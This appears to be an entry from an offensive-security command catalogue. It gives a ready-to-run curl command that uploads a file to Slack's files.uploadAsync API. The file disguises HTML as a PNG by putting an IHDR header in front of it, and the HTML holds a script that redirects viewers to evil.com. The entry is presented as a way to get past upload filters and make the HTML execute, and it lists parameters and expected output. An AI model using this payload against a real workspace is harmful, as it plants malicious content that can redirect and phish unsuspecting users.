---
id: cmd-slack-upload-png-bypass
data: >-
  curl -X POST https://upload.slack.com/api/files.uploadAsync -H "Content-Type:
  multipart/form-data; boundary=---------------------------4751760627167"
  --data-binary
  "-----------------------------4751760627167\nContent-Disposition: form-data;
  name=\"file\"; filename=\"pix\"\nContent-Type: text/html\n\nIHDR \u0001
  \u0001\u0006\u0002 ¯wSB \u0001sRGB ®.\u001cé \u0004gAMA ±Æ\u000bü
  a\u0005\n<html>\n<script>\nwindow.location='http://www.evil.com';\n</script>\n</html>\n-----------------------------4751760627167--"
  -F "filename=pix" -F "token=$SLACK_TOKEN" -F "channels=$CHANNEL_ID" -F
  "title=pix"
tags:
  - upload
  - bypass
  - slack
type: command
output: '{"ok":true,"file":{"id":"F1AU0FTGR"}}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:27.310Z'
verified: false
validated: true
submitted: true
---
# slack-upload-png-header-bypass

## Command

```bash
curl -X POST https://upload.slack.com/api/files.uploadAsync -H "Content-Type: multipart/form-data; boundary=---------------------------4751760627167" --data-binary "-----------------------------4751760627167\nContent-Disposition: form-data; name=\"file\"; filename=\"pix\"\nContent-Type: text/html\n\nIHDR \u0001 \u0001\u0006\u0002 ¯wSB \u0001sRGB ®.\u001cé \u0004gAMA ±Æ\u000bü a\u0005\n<html>\n<script>\nwindow.location='http://www.evil.com';\n</script>\n</html>\n-----------------------------4751760627167--" -F "filename=pix" -F "token=$SLACK_TOKEN" -F "channels=$CHANNEL_ID" -F "title=pix"
```

## Description

This command tests persistence after mitigation by using a PNG IHDR header as binary prefix to upload HTML without extension, enabling execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$SLACK_TOKEN` | Slack API token | Yes |
| `$CHANNEL_ID` | Channel to upload to | Yes |
| `--data-binary` | PNG header + HTML content | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://upload.slack.com/api/files.uploadAsync # (as above)
```

### Advanced Usage

Adapt for different binary headers.

## Expected Output

Successful JSON with file ID, allowing public link creation.

## Related

- [[commands/slack-upload-binary-html-redirect]]
- [[procedures/Upload-Malicious-HTML-File-with-Binary-Prefix]]
